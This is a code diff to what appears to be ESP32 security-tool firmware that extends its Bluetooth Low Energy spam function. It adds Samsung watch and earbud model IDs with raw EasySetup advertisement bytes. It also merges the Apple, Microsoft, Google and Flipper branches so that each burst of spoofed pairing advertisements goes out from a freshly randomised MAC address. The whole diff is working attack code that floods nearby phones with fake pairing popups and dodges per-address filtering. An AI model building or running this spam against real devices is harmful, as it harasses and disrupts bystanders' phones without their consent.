@@ -154,7 +154,7 @@ extern "C" {
 
         AdvData_Raw = new uint8_t[15];
 
-        uint8_t model = watch_models[rand() % 25].value;
+        uint8_t model = watch_models[rand() % 26].value;
         
         AdvData_Raw[i++] = 14; // Size
         AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
@@ -1887,22 +1887,28 @@ void WiFiScan::RunSetup() {
     mac_entry_state[i] = 0;
 
   #ifdef HAS_BT
-    watch_models = new WatchModel[20] {
+    watch_models = new WatchModel[26] {
       {0x1A, "Fallback Watch"},
+      {0x01, "White Watch4 Classic 44m"},
       {0x02, "Black Watch4 Classic 40m"},
       {0x03, "White Watch4 Classic 40m"},
+      {0x04, "Black Watch4 44mm"},
+      {0x05, "Silver Watch4 44mm"},
       {0x06, "Green Watch4 44mm"},
       {0x07, "Black Watch4 40mm"},
       {0x08, "White Watch4 40mm"},
       {0x09, "Gold Watch4 40mm"},
+      {0x0A, "French Watch4"},
       {0x0B, "French Watch4 Classic"},
       {0x0C, "Fox Watch5 44mm"},
       {0x11, "Black Watch5 44mm"},
       {0x12, "Sapphire Watch5 44mm"},
+      {0x13, "Purpleish Watch5 40mm"},
       {0x14, "Gold Watch5 40mm"},
       {0x15, "Black Watch5 Pro 45mm"},
       {0x16, "Gray Watch5 Pro 45mm"},
       {0x17, "White Watch5 44mm"},
+      {0x18, "White & Black Watch5"},
       {0x1B, "Black Watch6 Pink 40mm"},
       {0x1C, "Gold Watch6 Gold 40mm"},
       {0x1D, "Silver Watch6 Cyan 44mm"},
@@ -4582,64 +4588,34 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
 
-    if (type == Apple2) {
-      this->setBaseMacAddress(macAddr);
-      NimBLEDevice::init("");
-      NimBLEServer *pServer = NimBLEDevice::createServer();
+    if (type == Apple2 || type == Apple || type == Microsoft || type == Google || type == FlipperZero) {
+      // Simondankelmann-parity: rotate MAC per ad via NimBLE setOwnAddr(), burst multiple payloads per call.
+      EBLEPayloadType ad_type = (type == Apple2) ? Apple : type;
 
-      pAdvertising = pServer->getAdvertising();
-
-      delay(10);
-
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
-      pAdvertising->setAdvertisementData(advertisementData);
-
-      #ifdef HAS_NIMBLE_2
-        pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON : BLE_GAP_CONN_MODE_UND);
-        pAdvertising->setDiscoverableMode(random(3));
-        pAdvertising->setMinInterval(0x20);
-        pAdvertising->setMaxInterval(0x20);
-        pAdvertising->setPreferredParams(0x20, 0x20);
-      #else
-        pAdvertising->setMaxInterval(0x20);
-        pAdvertising->setMinInterval(0x20);
-        pAdvertising->setMinPreferred(0x20);
-        pAdvertising->setMaxPreferred(0x20);
-      #endif
-
-      pAdvertising->start();
-      delay(500);
-      pAdvertising->stop();
-
-      delay(10);
-
-      NimBLEDevice::deinit();
-    }
-    else if (type == Apple) {
-      if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0) || (!this->ble_initialized)) {
-        this->setBaseMacAddress(macAddr);
-
+      if (!this->ble_initialized) {
+        uint8_t smac[6];
+        generateRandomMac(smac);
+        esp_base_mac_addr_set(smac);
         NimBLEDevice::init("");
+        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
         NimBLEServer *pServer = NimBLEDevice::createServer();
-
         pAdvertising = pServer->getAdvertising();
-
-        delay(40);
-
-        NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
-        pAdvertising->setAdvertisementData(advertisementData);
-
+        pAdvertising->setMinInterval(0x20);
+        pAdvertising->setMaxInterval(0x20);
         this->ble_initialized = true;
       }
 
-      pAdvertising->start();
-      delay(60);
-      pAdvertising->stop();
+      for (uint8_t n = 0; n < 6; n++) {
+        uint8_t rmac[6];
+        generateRandomMac(rmac);
+        rmac[5] |= 0xC0;  // random static address
+        NimBLEDevice::setOwnAddr(rmac);
 
-      if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0)) {
-        this->last_sour_apple_update = now_time;
-        NimBLEDevice::deinit();
-        this->ble_initialized = false;
+        NimBLEAdvertisementData ad = this->GetUniversalAdvertisementData(ad_type);
+        pAdvertising->setAdvertisementData(ad);
+        pAdvertising->start();
+        delay(40);
+        pAdvertising->stop();
       }
     }
     else if (type == Airtag) {
@@ -4675,25 +4651,117 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
         }
       }
     }
+    else if (type == Samsung) {
+      // Simondankelmann-parity: rotate MAC per model via NimBLE setOwnAddr()
+      // so every advertisement goes out with a unique (MAC, model_id) pair.
+      // Emits both EasySetup Watch (26 variants) and EasySetup Buds (20 variants).
+      static uint8_t s_samsung_watch_cursor = 0;
+      static uint8_t s_samsung_buds_cursor = 0;
+      static uint32_t s_samsung_calls = 0;
+      s_samsung_calls++;
+
+      // Samsung EasySetup Buds device IDs (3 bytes each) from simondankelmann/Bluetooth-LE-Spam
+      static const uint8_t buds_models[20][3] = {
+        {0xEE,0x7A,0x0C}, {0x9D,0x17,0x00}, {0x39,0xEA,0x48}, {0xA7,0xC6,0x2C},
+        {0x85,0x01,0x16}, {0x3D,0x8F,0x41}, {0x3B,0x6D,0x02}, {0xAE,0x06,0x3C},
+        {0xB8,0xB9,0x05}, {0xEA,0xAA,0x17}, {0xD3,0x07,0x04}, {0x9D,0xB0,0x06},
+        {0x10,0x1F,0x1A}, {0x85,0x96,0x08}, {0x8E,0x45,0x03}, {0x2C,0x67,0x40},
+        {0x3F,0x67,0x18}, {0x42,0xC5,0x19}, {0xAE,0x07,0x3A}, {0x01,0x17,0x16}
+      };
+
+      if (!this->ble_initialized) {
+        uint8_t smac[6];
+        generateRandomMac(smac);
+        esp_base_mac_addr_set(smac);
+        NimBLEDevice::init("");
+        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+        NimBLEServer *pServer = NimBLEDevice::createServer();
+        pAdvertising = pServer->getAdvertising();
+        pAdvertising->setMinInterval(0x20);
+        pAdvertising->setMaxInterval(0x20);
+        this->ble_initialized = true;
+        Serial.println("[SSpam] init once (watch+buds)");
+      }
+
+      // Burst 6 ads per call: 3 watches + 3 buds, alternating
+      for (uint8_t n = 0; n < 6; n++) {
+        // Rotate MAC per advertisement (random static address: top 2 bits = 11)
+        uint8_t rmac[6];
+        generateRandomMac(rmac);
+        rmac[5] |= 0xC0;
+        NimBLEDevice::setOwnAddr(rmac);
+
+        NimBLEAdvertisementData ad;
+
+        if ((n & 1) == 0) {
+          // --- EasySetup Watch (15-byte AdvData) ---
+          uint8_t idx = s_samsung_watch_cursor;
+          s_samsung_watch_cursor = (s_samsung_watch_cursor + 1) % 26;
+          uint8_t model_val = watch_models[idx].value;
+
+          uint8_t raw[15];
+          uint8_t p = 0;
+          raw[p++] = 14;
+          raw[p++] = 0xFF;
+          raw[p++] = 0x75; raw[p++] = 0x00;
+          raw[p++] = 0x01; raw[p++] = 0x00;
+          raw[p++] = 0x02; raw[p++] = 0x00;
+          raw[p++] = 0x01; raw[p++] = 0x01;
+          raw[p++] = 0xFF;
+          raw[p++] = 0x00; raw[p++] = 0x00;
+          raw[p++] = 0x43;
+          raw[p++] = model_val;
+
+          #ifndef HAS_NIMBLE_2
+            ad.addData(std::string((char *)raw, 15));
+          #else
+            ad.addData(raw, 15);
+          #endif
+
+          if ((s_samsung_calls == 1) && n < 2) {
+            Serial.printf("[SSpam] WATCH n=%u idx=%u mv=0x%02X\n", n, idx, model_val);
+          }
+        } else {
+          // --- EasySetup Buds (28-byte AdvData) ---
+          uint8_t idx = s_samsung_buds_cursor;
+          s_samsung_buds_cursor = (s_samsung_buds_cursor + 1) % 20;
+          const uint8_t *id = buds_models[idx];
+
+          uint8_t raw[28];
+          uint8_t p = 0;
+          raw[p++] = 27;          // length
+          raw[p++] = 0xFF;        // Manufacturer Specific Data
+          raw[p++] = 0x75; raw[p++] = 0x00;  // Samsung
+          // prepended: 42 09 81 02 14 15 03 21 01 09
+          raw[p++] = 0x42; raw[p++] = 0x09; raw[p++] = 0x81; raw[p++] = 0x02; raw[p++] = 0x14;
+          raw[p++] = 0x15; raw[p++] = 0x03; raw[p++] = 0x21; raw[p++] = 0x01; raw[p++] = 0x09;
+          // device id expanded: id0 id1 01 id2
+          raw[p++] = id[0]; raw[p++] = id[1]; raw[p++] = 0x01; raw[p++] = id[2];
+          // appended: 06 3C 94 8E 00 00 00 00 C7 00
+          raw[p++] = 0x06; raw[p++] = 0x3C; raw[p++] = 0x94; raw[p++] = 0x8E; raw[p++] = 0x00;
+          raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0xC7; raw[p++] = 0x00;
+
+          #ifndef HAS_NIMBLE_2
+            ad.addData(std::string((char *)raw, 28));
+          #else
+            ad.addData(raw, 28);
+          #endif
+
+          if ((s_samsung_calls == 1) && n < 3) {
+            Serial.printf("[SSpam] BUDS  n=%u idx=%u id=%02X%02X%02X\n", n, idx, id[0], id[1], id[2]);
+          }
+        }
+
+        pAdvertising->setAdvertisementData(ad);
+        pAdvertising->start();
+        delay(40);
+        pAdvertising->stop();
+      }
+    }
     else if ((type == Microsoft) ||
              (type == Google) ||
-             (type == Samsung) ||
              (type == FlipperZero)) {
-      this->setBaseMacAddress(macAddr);
-
-      NimBLEDevice::init("");
-
-      NimBLEServer *pServer = NimBLEDevice::createServer();
-
-      pAdvertising = pServer->getAdvertising();
-
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
-      pAdvertising->setAdvertisementData(advertisementData);
-      pAdvertising->start();
-      delay(10);
-      pAdvertising->stop();
-
-      NimBLEDevice::deinit();
+      // Handled by the unified branch above.
     }
   #endif
 }
